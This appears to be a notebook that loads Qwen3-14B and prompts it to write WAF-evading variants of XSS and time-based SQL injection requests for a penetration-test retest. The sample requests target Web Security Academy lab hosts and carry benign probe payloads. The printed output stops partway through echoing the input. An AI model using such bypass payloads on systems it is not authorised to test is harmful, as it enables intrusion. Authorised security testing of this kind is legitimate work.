In [1]:
%%capture
import os, re
if "COLAB_" not in "".join(os.environ.keys()):
    !pip install unsloth  # Do this in local & cloud setups
else:
    import torch; v = re.match(r'[\d]{1,}\.[\d]{1,}', str(torch.__version__)).group(0)
    xformers = 'xformers==' + {'2.10':'0.0.34','2.9':'0.0.33.post1','2.8':'0.0.32.post2'}.get(v, "0.0.34")
    !pip install sentencepiece protobuf "datasets==4.3.0" "huggingface_hub>=0.34.0" hf_transfer
    !pip install --no-deps unsloth_zoo bitsandbytes accelerate {xformers} peft trl triton unsloth
    !pip install --no-deps --upgrade "torchao>=0.16.0"
!pip install transformers==4.56.2
!pip install --no-deps trl==0.22.2

# install necessary requirements into the Colab environment

In [2]:
# import unsloth library
from unsloth import FastLanguageModel

🦥 Unsloth: Will patch your computer to enable 2x faster free finetuning.
🦥 Unsloth Zoo will now patch everything to make training faster!


In [3]:
# initialise base model
model, tokenizer = FastLanguageModel.from_pretrained(
    model_name = "unsloth/Qwen3-14B",
    max_seq_length = 2048, # long enough to read the sys prompt and user input
    load_in_4bit = True,
    full_finetuning = False,
)

==((====))==  Unsloth 2026.4.8: Fast Qwen3 patching. Transformers: 4.56.2.
   \\   /|    Tesla T4. Num GPUs = 1. Max memory: 14.563 GB. Platform: Linux.
O^O/ \_/ \    Torch: 2.10.0+cu128. CUDA: 7.5. CUDA Toolkit: 12.8. Triton: 3.6.0
\        /    Bfloat16 = FALSE. FA [Xformers = 0.0.34. FA2 = False]
 "-____-"     Free license: http://github.com/unslothai/unsloth
Unsloth: Fast downloading is enabled - ignore downloading bars which are red colored!


model.safetensors.index.json: 0.00B [00:00, ?B/s]

model-00001-of-00003.safetensors:   0%|          | 0.00/4.97G [00:00<?, ?B/s]

model-00002-of-00003.safetensors:   0%|          | 0.00/4.59G [00:00<?, ?B/s]

model-00003-of-00003.safetensors:   0%|          | 0.00/1.56G [00:00<?, ?B/s]

...

added_tokens.json:   0%|          | 0.00/707 [00:00<?, ?B/s]

special_tokens_map.json:   0%|          | 0.00/614 [00:00<?, ?B/s]

tokenizer.json:   0%|          | 0.00/11.4M [00:00<?, ?B/s]

chat_template.jinja: 0.00B [00:00, ?B/s]

unsloth/qwen3-14b-unsloth-bnb-4bit does not have a padding token! Will use pad_token = <|PAD_TOKEN|>.


In [4]:
# define system prompt
system_prompt = """You are an assistant to a penetration tester who is performing a retest for previously identified web injection vulnerabilities. The client has protected their website by implementing a WAF or using input validation and sanitisation.

You will be provided with the successful HTTP request from a previous test.

You must:
    - Create a new variant of this that will determine if the underlying vulnerability is still present regardless of any WAF or input validation/sanitisation in place
    - Use a creative payload as the previous one is blocked by the WAF/sanitisation/validation
    - Output only a valid HTTP request
    - Modify only the injection payload value while preserving the exact HTTP method, path, headers, parameters, and formatting.
    - Use a payload that is suitable for a penetration test - i.e. proves the vulnerability exists but causes no harm
"""

# define input requests
previous_XSS_request = """GET /?search=%3Cscript%3Econsole.log(%27XSS_test_1%27)%3C/script%3E HTTP/2
Host: 0ac700c503cf448582962e12006000aa.web-security-academy.net
Cookie: session=He5HZqzMetrYHFwP8nL62NPiFiAIk0P9
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i"""

previous_SQLi_request = """GET /filter?category=Accessories%27+UNION+SELECT+SLEEP(2),NULL--+- HTTP/2
Host: 0a09000d03c638fb815cf748007000be.web-security-academy.net
Cookie: session=FQmvGl1yzzDwhrCMiyumxNypkPZA3MGI
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i"""

In [7]:
# comment/uncomment as necessary - to test either XSS or SQLi request generation
previous_request = previous_XSS_request
# previous_request = previous_SQLi_request

# format messages as required
messages = [
    {"role": "system", "content": system_prompt},
    {"role": "user", "content": previous_request}
]

# convert messages to tokens
text = tokenizer.apply_chat_template(
    messages,
    tokenize = False,
    add_generation_prompt = True,
    enable_thinking = False, # disabled as it uses > 1000 new tokens for thinking
)
inputs = tokenizer(text, return_tensors="pt").to("cuda")

In [12]:
# generate an output
outputs = model.generate(
    **inputs,
    max_new_tokens = 1000,
    temperature = 0.7,
    top_p = 0.8,
    top_k = 20,
)

print(tokenizer.decode(outputs[0], skip_special_tokens=True))

system
You are an assistant to a penetration tester who is performing a retest for previously identified web injection vulnerabilities. The client has protected their website by implementing a WAF or using input validation and sanitisation. 

You will be provided with the successful HTTP request from a previous test. 

You must:
    - Create a new variant of this that will determine if the underlying vulnerability is still present regardless of any WAF or input validation/sanitisation in place
    - Use a creative payload as the previous one is blocked by the WAF/sanitisation/validation
    - Output only a valid HTTP request
    - Modify only the injection payload value while preserving the exact HTTP method, path, headers, parameters, and formatting.
    - Use a payload that is suitable for a penetration test - i.e. proves the vulnerability exists but causes no harm

user
GET /?search=%3Cscript%3Econsole.log(%27XSS_test_1%27)%3C/script%3E HTTP/2
Host: 0ac700c503cf448582962e12006000aa.